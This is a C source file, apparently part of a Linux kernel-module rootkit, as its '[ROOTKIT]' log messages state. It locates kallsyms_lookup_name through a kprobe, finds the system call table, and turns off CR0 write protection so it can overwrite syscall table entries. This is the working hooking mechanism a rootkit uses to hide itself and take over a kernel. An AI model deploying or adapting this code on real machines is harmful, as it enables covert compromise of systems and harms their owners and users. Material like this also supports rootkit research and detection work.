#include <asm-generic/errno-base.h>
#include <asm/processor-flags.h>
#include <asm/special_insns.h>
#include <linux/kprobes.h>

#include "hooking.h"

static kallsyms_t lookup_name;
static uint64_t *p_syscall_table;

static inline void cr0_write(unsigned long val)
{
	asm volatile("mov %0,%%cr0" : "+r"(val) : : "memory");
}

static inline unsigned long unprotect_memory(void)
{
	unsigned long ul_orig_cr0;
	unsigned long ul_new_cr0;

	ul_orig_cr0 = native_read_cr0(); // in special_insns.h
	ul_new_cr0 = ul_orig_cr0 & ~(X86_CR0_WP); // in processor-flags.h
	cr0_write(ul_new_cr0);
	return ul_orig_cr0;
}

static inline void protect_memory(unsigned long ul_orig_cr0)
{
	cr0_write(ul_orig_cr0);
}

int init_hooking(void)
{
	int i_err;

	// Declare what we need to find
	struct kprobe probe = {
		.symbol_name = KALLSYMS_NAME,
	};

	i_err = register_kprobe(&probe);
	if (i_err) {
		pr_err("[ROOTKIT] Failed to get kallsyms_lookup_name() address.");
		return i_err;
	}

	// Function pointer type of kallsyms_lookup_name()
	lookup_name = (kallsyms_t)(probe.addr);
	pr_info("[ROOTKIT] kallsym_lookup_name() address: %p", lookup_name);

	// Cleanup kprobe as we don't need it anymore
	unregister_kprobe(&probe);

	// Find syscall table address
	p_syscall_table = lookup_name(SYS_CALL_TABLE_NAME);
	pr_info("[ROOTKIT] Syscall table address: %p", p_syscall_table);

	return 0;
}

sysfun_t get_syscall_entry(size_t sz_syscall_nr)
{
	return (sysfun_t)p_syscall_table[sz_syscall_nr];
}

void set_syscall_entry(size_t sz_syscall_nr, sysfun_t new_sysfun)
{
	unsigned long ul_orig_cr0;
	ul_orig_cr0 = unprotect_memory();
	p_syscall_table[sz_syscall_nr] = (uint64_t)new_sysfun;
	protect_memory(ul_orig_cr0);
}